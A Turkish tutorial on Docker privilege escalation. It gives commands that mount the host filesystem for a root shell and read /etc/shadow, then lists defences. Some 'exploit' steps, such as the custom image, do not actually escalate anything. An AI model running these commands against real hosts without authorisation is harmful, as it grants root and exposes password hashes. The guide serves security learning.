### Docker ile Privilege Escalation (Yetki Yükseltme) Rehberi

Docker, konteyner tabanlı bir sanallaştırma platformudur. Yanlış yapılandırılmış Docker izinleri, saldırganların root yetkisi elde etmesi için fırsatlar sunabilir. Bu rehberde, Docker kullanılarak nasıl yetki yükseltme yapılacağını detaylı bir şekilde açıklayacağız.

---

#### 1. **Docker Nedir?**
Docker, uygulamaları ve bağımlılıklarını izole bir şekilde çalıştırmak için kullanılan bir platformdur. Ancak, bir kullanıcı Docker grubuna üye olduğunda, bu kullanıcı neredeyse sınırsız yetkiye sahip olabilir.

---

#### 2. **Docker Grubu Üyeliğini Kontrol Etme**
Sistemde Docker grubuna üye olup olmadığınızı kontrol etmek için şu komutu kullanabilirsiniz:
```bash
id
```
Eğer çıktıda `docker` grubu görünüyorsa, bu gruba üyeliğiniz vardır:
```
uid=1001(ahmet) gid=1001(ahmet) groups=1001(ahmet),110(docker)
```
Bu durumda, Docker yetkileri üzerinden yetki yükseltme yapılabilir.

---

#### 3. **Yetki Yükseltme için Gereken Adımlar**

##### Adım 1: **Docker Grubuna Üyeliği Kullanma**
Docker grubundaki bir kullanıcı, root yetkisine eşdeğer yetkilere sahiptir. Docker'ı kullanarak bir konteyner oluşturabilir ve host sistemine erişim sağlayabilirsiniz.

**Host Sistemde Root Shell Elde Etmek İçin:**
1. Root yetkileriyle bir Docker konteyneri çalıştırın:
    ```bash
    docker run -v /:/mnt --rm -it alpine chroot /mnt sh
    ```
    Bu komut, host dosya sistemini bir konteyner içinde bağlar ve chroot kullanarak root shell açar.

2. Root shell elde ettiğinizde, sistemde istediğiniz işlemleri gerçekleştirebilirsiniz.

##### Adım 2: **Mevcut Konteynerleri Kötüye Kullanma**
Sistemde çalışan Docker konteynerleri üzerinden yetki yükseltmek için:
1. Çalışan konteynerleri listeleyin:
    ```bash
    docker ps -a
    ```
2. Bir konteynerin içine girin:
    ```bash
    docker exec -it <container_id> /bin/sh
    ```
    Eğer konteyner root yetkileriyle çalışıyorsa, host sistemine zarar verebilecek işlemler yapabilirsiniz.

##### Adım 3: **Özel Bir Görüntü Kullanma**
Docker yetkilerini suistimal etmek için özel bir görüntü oluşturabilirsiniz. Örneğin:
1. Kötü niyetli bir Dockerfile oluşturun:
    ```dockerfile
    FROM alpine
    CMD ["/bin/sh"]
    ```
2. Docker imajını oluşturun ve çalıştırın:
    ```bash
    docker build -t exploit .
    docker run --rm -it exploit
    ```

---

#### 4. **Yaygın Saldırı Senaryoları**

##### Senaryo 1: Docker Socket İstismarı
Eğer bir kullanıcı Docker socket’ine erişebiliyorsa, root yetkisi kazanabilir. Docker socket erişimini kontrol etmek için:
```bash
ls -l /var/run/docker.sock
```
Eğer yazma izniniz varsa, root yetkisine sahip olabilirsiniz.

##### Senaryo 2: Hassas Dosyalara Erişim
Docker kullanarak host sistemde hassas dosyalara erişmek mümkündür. Örneğin:
```bash
docker run -v /etc:/mnt --rm -it alpine cat /mnt/shadow
```
Bu komut, `/etc/shadow` dosyasını okumanıza olanak tanır.

##### Senaryo 3: Güvensiz İmajlar Kullanma
Güvenilmeyen Docker imajları kullanıldığında, kötü amaçlı kod host sisteminde çalıştırılabilir. Örneğin:
```bash
docker run --rm -it malicious_image
```

---

#### 5. **Savunma Yöntemleri**
Docker tabanlı yetki yükseltme saldırılarından korunmak için şu önlemleri alabilirsiniz:

1. **Docker Grubuna Erişimi Kısıtlayın:**
   Yalnızca güvenilir kullanıcıların Docker grubuna erişmesine izin verin:
   ```bash
   sudo gpasswd -d <kullanıcı> docker
   ```

2. **Docker Socket İzinlerini Kısıtlayın:**
   `/var/run/docker.sock` dosyasının yalnızca root ve yetkili kullanıcılar tarafından erişilebilir olduğundan emin olun.

3. **Güvenilir İmajlar Kullanın:**
   Docker Hub gibi kaynaklardan yalnızca resmi ve güvenilir imajları indirin.

4. **Kaynakları İzole Edin:**
   Konteynerlerin yalnızca gerekli kaynaklara erişmesine izin verin. Örneğin, `--cap-drop` seçeneği ile gereksiz yetenekleri kaldırabilirsiniz:
   ```bash
   docker run --rm -it --cap-drop=ALL alpine
   ```

5. **Güncellemeleri Yapın:**
   Docker ve ilgili bileşenlerin güncel olduğundan emin olun.

---

Bu rehberde Docker'ın yetki yükseltme saldırıları için nasıl kullanılabileceğini ve bu tür saldırılardan nasıl korunabileceğinizi öğrendiniz. Etik kurallar çerçevesinde çalışmayı unutmayın.

